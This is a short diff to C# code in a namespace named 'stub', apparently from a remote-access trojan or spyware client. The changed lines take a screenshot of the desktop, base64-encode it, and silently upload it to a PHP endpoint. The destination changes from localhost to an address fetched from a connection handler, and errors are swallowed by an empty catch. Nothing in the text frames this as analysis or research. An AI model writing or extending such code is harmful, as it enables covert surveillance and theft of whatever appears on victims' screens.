@@ -80,7 +80,7 @@ namespace stub
                 nameValues.Add("desktop64", Convert.ToBase64String(GetDesktop().ToArray()));
 
 
-                webclient.UploadValues("http://127.0.0.1/senddesktop.php", nameValues);
+                webclient.UploadValues("http://" + ConnectionIPHandler.GetIP() + "/senddesktop.php", nameValues);
             }
             catch { }
         }
